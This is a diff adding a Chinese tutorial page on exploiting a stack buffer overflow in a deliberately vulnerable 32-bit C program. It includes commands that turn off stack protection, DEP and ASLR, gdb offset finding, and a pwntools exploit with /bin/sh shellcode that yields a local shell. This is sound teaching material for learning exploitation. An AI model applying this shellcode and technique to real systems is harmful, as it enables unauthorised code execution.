@@ -1,0 +1,132 @@
+I"�<p>源代码如下:</p>
+
+<pre><code class="language-C">$ cat level1.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void vulnerable_function(){
+    char buf[128];
+    read(STDIN_FILENO, buf, 256);
+}
+int main()
+{
+    vulnerable_function();
+    write(STDOUT_FILENO, "Hello, World\n", 13);
+    return 0;
+}
+</code></pre>
+<h3 id="step1编译源文件">step1:编译源文件</h3>
+
+<p><em><code class="highlighter-rouge">32</code>位系统:</em></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      gcc -fno-stack-protector -zexecstack level1.c -o level1
+</code></pre></div></div>
+<p><em><code class="highlighter-rouge">64</code>位系统:</em></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      gcc -fno-stack-protector -z execstack level1.c -o level1 -m32
+</code></pre></div></div>
+
+<p>其中 <code class="highlighter-rouge">-fno-stack-protector</code>作用是关掉stack protector, <code class="highlighter-rouge">-zexecstack</code>作用是关掉<code class="highlighter-rouge">DEP</code>。</p>
+
+<h3 id="step2关闭aslr">step2:关闭<code class="highlighter-rouge">ASLR</code></h3>
+<p>执行：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      sudo -s
+      echo 0 &gt; /proc/sys/kernel/randomize_va_space
+      exit
+</code></pre></div></div>
+
+<h3 id="step3反汇编level1">step3:反汇编<code class="highlighter-rouge">level1</code></h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -d level1
+
+0000054d &lt;vulnerable_function&gt;:
+ 54d:	55                   	push   %ebp
+ 54e:	89 e5                	mov    %esp,%ebp
+ 550:	53                   	push   %ebx
+ 551:	81 ec 84 00 00 00    	sub    $0x84,%esp
+ 557:	e8 6a 00 00 00       	call   5c6 &lt;__x86.get_pc_thunk.ax&gt;
+ 55c:	05 78 1a 00 00       	add    $0x1a78,%eax
+ 561:	83 ec 04             	sub    $0x4,%esp
+ 564:	68 00 01 00 00       	push   $0x100
+ 569:	8d 95 78 ff ff ff    	lea    -0x88(%ebp),%edx        #the address of buf is $ebp-0x88
+ 56f:	52                   	push   %edx
+ 570:	6a 00                	push   $0x0
+ 572:	89 c3                	mov    %eax,%ebx
+ 574:	e8 57 fe ff ff       	call   3d0 &lt;read@plt&gt;
+ 579:	83 c4 10             	add    $0x10,%esp
+ 57c:	90                   	nop
+ 57d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
+ 580:	c9                   	leave  
+ 581:	c3                   	ret    
+</code></pre></div></div>
+<p>通过查看<code class="highlighter-rouge">vulnerable_function()</code>的汇编代码可以知道<code class="highlighter-rouge">buf</code>的地址为<code class="highlighter-rouge">$ebp-0x88</code>,即<code class="highlighter-rouge">vulnerable_function()</code>函数的<code class="highlighter-rouge">stack</code>分布为：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      |----------------------|
+      |                      |
+      |----------------------|&lt;-----return address(ebp+0x04)
+      |                      |
+      |----------------------|&lt;-----ebp
+      |                      |
+      |                      |
+      |                      |
+      |                      |
+      |                      |
+      |----------------------|&lt;-----buf(ebp-0x88)
+</code></pre></div></div>
+<p>所以只要读入的数据大于<code class="highlighter-rouge">0x88+0x04</code>就覆盖掉返回地址。接下来只要确定<code class="highlighter-rouge">buf</code>的地址，用<code class="highlighter-rouge">buf</code>的地址覆盖<code class="highlighter-rouge">return address</code>即可将执行<code class="highlighter-rouge">buff</code>内的<code class="highlighter-rouge">shellcode</code>.</p>
+
+<h3 id="step4确定buff的地址">step4:确定<code class="highlighter-rouge">buff</code>的地址</h3>
+
+<p>这里选用<code class="highlighter-rouge">140(0x88+0x04)</code>个<code class="highlighter-rouge">a</code>和<code class="highlighter-rouge">bbbb</code>来作为输入，使程序<code class="highlighter-rouge">crash</code>。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+</code></pre></div></div>
+<p>在执行<code class="highlighter-rouge">level1</code>之前要先开启<code class="highlighter-rouge">core dump</code>,具体做法为：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ulimit -c unlimit
+sudo -s
+echo "/tmp/core.%t" &gt; /proc/sys/kernel/core_pattern
+exit
+</code></pre></div></div>
+<p>然后执行<code class="highlighter-rouge">level1</code>：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./level1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+Segmentation fault (core dumped)
+</code></pre></div></div>
+<p>使用<code class="highlighter-rouge">gdb</code>确定<code class="highlighter-rouge">buf</code>的地址：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb ./level1 /tmp/core.xxxxxxxx -q
+Reading symbols from ./level1...(no debugging symbols found)...done.
+[New LWP 30069]
+Core was generated by `./level1'.
+Program terminated with signal SIGILL, Illegal instruction.
+#0  0xffffcf9e in ?? ()
+(gdb) x/s $esp-144
+0xffffcf10:	'a' &lt;repeats 140 times&gt;, "bbbb\n\317\377\377"
+</code></pre></div></div>
+<p>此时已经得到了<code class="highlighter-rouge">buf</code>的地址<code class="highlighter-rouge">0xffffcf10</code>.</p>
+
+<h3 id="step5编写exploit">step5:编写exploit</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat exp.py
+#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+
+p = process('./level1')
+ret =  0xffffcf10
+
+shellcode  = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode += "\x0b\xcd\x80"
+
+payload = shellcode + 'A'*(140-len(shellcode)) + p32(ret)
+
+p.send(payload)
+p.interactive()
+</code></pre></div></div>
+
+<h3 id="step6执行结果">step6:执行结果</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python exp1.py
+[+] Starting local process './level1': pid 16267
+[*] Switching to interactive mode
+$ whoami
+owl
+</code></pre></div></div>
+:ET
